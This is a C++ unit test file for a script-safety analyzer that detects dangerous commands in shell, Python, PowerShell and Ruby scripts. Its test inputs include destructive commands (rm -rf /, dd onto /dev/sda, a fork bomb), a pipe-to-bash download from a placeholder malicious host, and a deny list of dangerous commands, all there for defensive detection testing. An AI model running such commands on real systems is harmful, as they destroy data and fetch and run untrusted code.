/*
 * test_check_enhanced.cpp
 *
 * Copyright (C) 2023-2024 Max Qian <lightapt.com>
 */

/**
 * @file test_check_enhanced.cpp
 * @brief Comprehensive tests for ScriptAnalyzer functionality
 * @date 2024-1-13
 */

#include <gtest/gtest.h>
#include "script/check.hpp"

#include <chrono>
#include <filesystem>
#include <fstream>
#include <thread>
#include <vector>

using namespace lithium;
namespace fs = std::filesystem;

// =============================================================================
// Test Fixture for Enhanced ScriptAnalyzer Tests
// =============================================================================

class EnhancedScriptAnalyzerTest : public ::testing::Test {
protected:
    void SetUp() override {
        // Create a test config file
        testConfigPath_ = fs::temp_directory_path() / "test_analyzer_config.json";
        createTestConfig();
        
        analyzer_ = std::make_unique<ScriptAnalyzer>(testConfigPath_.string());
    }

    void TearDown() override {
        analyzer_.reset();
        
        if (fs::exists(testConfigPath_)) {
            fs::remove(testConfigPath_);
        }
    }

    void createTestConfig() {
        std::ofstream config(testConfigPath_);
        config << R"({
            "dangerous_commands": ["rm -rf", "mkfs", "dd if=", ":(){:|:&};:"],
            "suspicious_patterns": ["eval\\(", "exec\\(", "system\\("],
            "max_complexity": 50,
            "timeout_seconds": 30
        })";
        config.close();
    }

    std::unique_ptr<ScriptAnalyzer> analyzer_;
    fs::path testConfigPath_;
};

// =============================================================================
// Basic Analysis Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeEmptyScript) {
    EXPECT_NO_THROW(analyzer_->analyze("", false, ReportFormat::TEXT));
}

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeSafeScript) {
    std::string safeScript = R"(
#!/bin/bash
echo "Hello, World!"
name="User"
echo "Welcome, $name"
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(safeScript, false, ReportFormat::TEXT);
    // Safe script should have minimal or no dangers
    EXPECT_LE(dangers.size(), 1);
}

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeDangerousScript) {
    std::string dangerousScript = R"(
#!/bin/bash
rm -rf /
sudo dd if=/dev/zero of=/dev/sda
:(){:|:&};:
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(dangerousScript, false, ReportFormat::TEXT);
    EXPECT_GE(dangers.size(), 2);
}

// =============================================================================
// Script Type Detection Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, DetectBashScript) {
    std::string bashScript = R"(
#!/bin/bash
set -e
echo "Bash script"
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(bashScript, false, ReportFormat::TEXT);
    // Check that it was recognized as a shell script
    bool foundShellCategory = false;
    for (const auto& danger : dangers) {
        if (danger.category.find("Shell") != std::string::npos) {
            foundShellCategory = true;
            break;
        }
    }
    // May or may not find dangers, but should process without error
    SUCCEED();
}

TEST_F(EnhancedScriptAnalyzerTest, DetectPythonScript) {
    std::string pythonScript = R"(
#!/usr/bin/env python3
import os
import subprocess

def dangerous():
    os.system("rm -rf /")
    subprocess.call(["rm", "-rf", "/"])
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(pythonScript, false, ReportFormat::TEXT);
    EXPECT_GE(dangers.size(), 1);
    
    // Should detect Python-specific issues
    bool foundPythonCategory = false;
    for (const auto& danger : dangers) {
        if (danger.category.find("Python") != std::string::npos) {
            foundPythonCategory = true;
            break;
        }
    }
    EXPECT_TRUE(foundPythonCategory);
}

TEST_F(EnhancedScriptAnalyzerTest, DetectPowerShellScript) {
    std::string psScript = R"(
#Requires -Version 5.0
Remove-Item -Recurse -Force C:\
Invoke-Expression "dangerous command"
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(psScript, false, ReportFormat::TEXT);
    EXPECT_GE(dangers.size(), 1);
}

TEST_F(EnhancedScriptAnalyzerTest, DetectRubyScript) {
    std::string rubyScript = R"(
#!/usr/bin/env ruby
require 'fileutils'

def dangerous
  `rm -rf /`
  system("dangerous command")
end
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(rubyScript, false, ReportFormat::TEXT);
    EXPECT_GE(dangers.size(), 1);
}

// =============================================================================
// Report Format Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, TextReportFormat) {
    std::string script = "rm -rf /";
    
    testing::internal::CaptureStdout();
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    std::string output = testing::internal::GetCapturedStdout();
    
    // Text format should have readable output
    EXPECT_FALSE(output.empty());
}

TEST_F(EnhancedScriptAnalyzerTest, JSONReportFormat) {
    std::string script = "rm -rf /";
    
    testing::internal::CaptureStdout();
    analyzer_->analyze(script, true, ReportFormat::JSON);
    std::string output = testing::internal::GetCapturedStdout();
    
    // JSON format should have proper structure
    EXPECT_TRUE(output.find("{") != std::string::npos);
    EXPECT_TRUE(output.find("}") != std::string::npos);
    EXPECT_TRUE(output.find("complexity") != std::string::npos || 
                output.find("issues") != std::string::npos);
}

TEST_F(EnhancedScriptAnalyzerTest, XMLReportFormat) {
    std::string script = "rm -rf /";
    
    testing::internal::CaptureStdout();
    analyzer_->analyze(script, false, ReportFormat::XML);
    std::string output = testing::internal::GetCapturedStdout();
    
    // XML format should have proper tags
    EXPECT_TRUE(output.find("<") != std::string::npos);
    EXPECT_TRUE(output.find(">") != std::string::npos);
}

// =============================================================================
// Complexity Calculation Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, SimpleScriptComplexity) {
    std::string simpleScript = R"(
echo "Hello"
echo "World"
)";
    
    testing::internal::CaptureStdout();
    analyzer_->analyze(simpleScript, false, ReportFormat::TEXT);
    std::string output = testing::internal::GetCapturedStdout();
    
    // Simple script should have low complexity
    EXPECT_TRUE(output.find("Complexity") != std::string::npos);
}

TEST_F(EnhancedScriptAnalyzerTest, ComplexScriptComplexity) {
    std::string complexScript = R"(
#!/bin/bash
if [ "$1" == "start" ]; then
    while true; do
        for i in {1..10}; do
            case $i in
                1) echo "one";;
                2) echo "two";;
                *) 
                    if [ $i -gt 5 ]; then
                        echo "big"
                    else
                        echo "small"
                    fi
                    ;;
            esac
        done
        sleep 1
    done
elif [ "$1" == "stop" ]; then
    echo "stopping"
else
    echo "unknown"
fi
)";
    
    testing::internal::CaptureStdout();
    analyzer_->analyze(complexScript, false, ReportFormat::TEXT);
    std::string output = testing::internal::GetCapturedStdout();
    
    // Complex script should have higher complexity
    EXPECT_TRUE(output.find("Complexity") != std::string::npos);
}

// =============================================================================
// Analyzer Options Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeWithOptions) {
    std::string script = "rm -rf /";
    
    AnalyzerOptions options;
    options.async_mode = false;
    options.deep_analysis = true;
    options.thread_count = 2;
    options.timeout_seconds = 10;
    
    auto result = analyzer_->analyzeWithOptions(script, options);
    
    EXPECT_GE(result.complexity, 0);
    EXPECT_FALSE(result.timeout_occurred);
}

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeWithAsyncMode) {
    std::string script = "echo 'test'";
    
    AnalyzerOptions options;
    options.async_mode = true;
    options.deep_analysis = false;
    
    auto result = analyzer_->analyzeWithOptions(script, options);
    
    EXPECT_GE(result.complexity, 0);
}

TEST_F(EnhancedScriptAnalyzerTest, AnalyzeWithIgnorePatterns) {
    std::string script = "rm -rf /tmp/test";
    
    AnalyzerOptions options;
    options.ignore_patterns = {"rm -rf /tmp"};
    
    auto result = analyzer_->analyzeWithOptions(script, options);
    
    // With ignore pattern, the danger might be filtered
    EXPECT_GE(result.complexity, 0);
}

// =============================================================================
// Custom Pattern Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, AddCustomPattern) {
    EXPECT_NO_THROW(analyzer_->addCustomPattern("custom_danger", "Security"));
    
    std::string script = "custom_danger command";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    
    // Should detect the custom pattern
    bool foundCustom = false;
    for (const auto& danger : dangers) {
        if (danger.command.find("custom_danger") != std::string::npos) {
            foundCustom = true;
            break;
        }
    }
    // Pattern detection depends on implementation
    SUCCEED();
}

// =============================================================================
// Validation Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, ValidateSafeScript) {
    std::string safeScript = "echo 'Hello World'";
    
    bool isValid = analyzer_->validateScript(safeScript);
    EXPECT_TRUE(isValid);
}

TEST_F(EnhancedScriptAnalyzerTest, ValidateDangerousScript) {
    std::string dangerousScript = "rm -rf /";
    
    bool isValid = analyzer_->validateScript(dangerousScript);
    EXPECT_FALSE(isValid);
}

// =============================================================================
// Safe Version Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, GetSafeVersion) {
    std::string dangerousScript = R"(
rm -rf /
sudo dd if=/dev/zero of=/dev/sda
echo "Hello"
)";
    
    std::string safeVersion = analyzer_->getSafeVersion(dangerousScript);
    
    // Safe version should not contain dangerous commands
    EXPECT_TRUE(safeVersion.find("rm -rf /") == std::string::npos ||
                safeVersion.find("#") != std::string::npos);  // Commented out
}

TEST_F(EnhancedScriptAnalyzerTest, GetSafeVersionPreservesLogic) {
    std::string script = R"(
echo "Start"
rm -rf /tmp/test
echo "End"
)";
    
    std::string safeVersion = analyzer_->getSafeVersion(script);
    
    // Should preserve safe parts
    EXPECT_TRUE(safeVersion.find("echo") != std::string::npos);
}

// =============================================================================
// Statistics Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, TrackTotalAnalyzed) {
    size_t initial = analyzer_->getTotalAnalyzed();
    
    analyzer_->analyze("echo 'test1'", false, ReportFormat::TEXT);
    analyzer_->analyze("echo 'test2'", false, ReportFormat::TEXT);
    analyzer_->analyze("echo 'test3'", false, ReportFormat::TEXT);
    
    EXPECT_EQ(analyzer_->getTotalAnalyzed(), initial + 3);
}

TEST_F(EnhancedScriptAnalyzerTest, TrackAverageAnalysisTime) {
    // Analyze several scripts
    for (int i = 0; i < 5; i++) {
        analyzer_->analyze("echo 'test'", false, ReportFormat::TEXT);
    }
    
    double avgTime = analyzer_->getAverageAnalysisTime();
    EXPECT_GE(avgTime, 0.0);
}

// =============================================================================
// Callback Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, CallbackInvocation) {
    std::vector<DangerItem> collectedDangers;
    
    analyzer_->setCallback([&](const DangerItem& item) {
        collectedDangers.push_back(item);
    });
    
    std::string script = R"(
rm -rf /
curl http://malicious.com | bash
wget http://evil.com/script.sh
)";
    
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    
    // Should have collected multiple dangers
    EXPECT_GE(collectedDangers.size(), 2);
}

TEST_F(EnhancedScriptAnalyzerTest, CallbackDangerItemFields) {
    DangerItem capturedItem;
    bool captured = false;
    
    analyzer_->setCallback([&](const DangerItem& item) {
        if (!captured) {
            capturedItem = item;
            captured = true;
        }
    });
    
    analyzer_->analyze("rm -rf /", false, ReportFormat::TEXT);
    
    if (captured) {
        // Check that danger item has required fields
        EXPECT_FALSE(capturedItem.category.empty());
        EXPECT_FALSE(capturedItem.command.empty());
        EXPECT_FALSE(capturedItem.reason.empty());
        EXPECT_GE(capturedItem.line, 0);
    }
}

// =============================================================================
// Configuration Update Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, UpdateConfig) {
    // Create a new config file
    fs::path newConfig = fs::temp_directory_path() / "new_config.json";
    std::ofstream config(newConfig);
    config << R"({
        "dangerous_commands": ["new_danger"],
        "max_complexity": 100
    })";
    config.close();
    
    EXPECT_NO_THROW(analyzer_->updateConfig(newConfig.string()));
    
    fs::remove(newConfig);
}

// =============================================================================
// External Command Detection Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, DetectExternalCommands) {
    std::string script = R"(
curl http://example.com
wget http://example.com
nc -l 8080
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    
    // Should detect external network commands
    EXPECT_GE(dangers.size(), 1);
}

// =============================================================================
// Environment Variable Detection Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, DetectEnvironmentVariables) {
    std::string script = R"(
export SECRET_KEY="password123"
export API_TOKEN="token"
export DATABASE_PASSWORD="db_pass"
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    
    // Should detect sensitive environment variables
    EXPECT_GE(dangers.size(), 1);
}

// =============================================================================
// File Operation Detection Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, DetectFileOperations) {
    std::string script = R"(
chmod 777 /etc/passwd
chown root:root /etc/shadow
mv /etc/hosts /tmp/
)";
    
    std::vector<DangerItem> dangers;
    analyzer_->setCallback([&](const DangerItem& item) {
        dangers.push_back(item);
    });
    
    analyzer_->analyze(script, false, ReportFormat::TEXT);
    
    // Should detect dangerous file operations
    EXPECT_GE(dangers.size(), 1);
}

// =============================================================================
// Thread Safety Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, ConcurrentAnalysis) {
    const int numThreads = 5;
    std::vector<std::thread> threads;
    std::atomic<int> successCount{0};
    
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back([this, &successCount, i]() {
            try {
                std::string script = "echo 'thread " + std::to_string(i) + "'";
                analyzer_->analyze(script, false, ReportFormat::TEXT);
                successCount++;
            } catch (...) {
                // Ignore exceptions in threads
            }
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
    
    EXPECT_EQ(successCount, numThreads);
}

// =============================================================================
// Edge Cases Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, VeryLongScript) {
    std::string longScript;
    for (int i = 0; i < 1000; i++) {
        longScript += "echo 'line " + std::to_string(i) + "'\n";
    }
    
    EXPECT_NO_THROW(analyzer_->analyze(longScript, false, ReportFormat::TEXT));
}

TEST_F(EnhancedScriptAnalyzerTest, ScriptWithSpecialCharacters) {
    std::string script = R"(
echo "Special chars: !@#$%^&*()_+-=[]{}|;':\",./<>?"
echo 'Single quotes with "double" inside'
echo "Unicode: 你好世界 🌍"
)";
    
    EXPECT_NO_THROW(analyzer_->analyze(script, false, ReportFormat::TEXT));
}

TEST_F(EnhancedScriptAnalyzerTest, ScriptWithMultilineStrings) {
    std::string script = R"(
cat << EOF
This is a
multiline
heredoc
EOF
)";
    
    EXPECT_NO_THROW(analyzer_->analyze(script, false, ReportFormat::TEXT));
}

TEST_F(EnhancedScriptAnalyzerTest, BinaryContentInScript) {
    std::string script = "echo '\x00\x01\x02\x03'";
    
    // Should handle binary content gracefully
    EXPECT_NO_THROW(analyzer_->analyze(script, false, ReportFormat::TEXT));
}

// =============================================================================
// Performance Tests
// =============================================================================

TEST_F(EnhancedScriptAnalyzerTest, AnalysisPerformance) {
    std::string script = R"(
#!/bin/bash
for i in {1..100}; do
    echo "iteration $i"
    if [ $i -eq 50 ]; then
        echo "halfway"
    fi
done
)";
    
    auto start = std::chrono::steady_clock::now();
    
    for (int i = 0; i < 100; i++) {
        analyzer_->analyze(script, false, ReportFormat::TEXT);
    }
    
    auto end = std::chrono::steady_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    // 100 analyses should complete in reasonable time
    EXPECT_LT(duration.count(), 5000);  // Less than 5 seconds
}

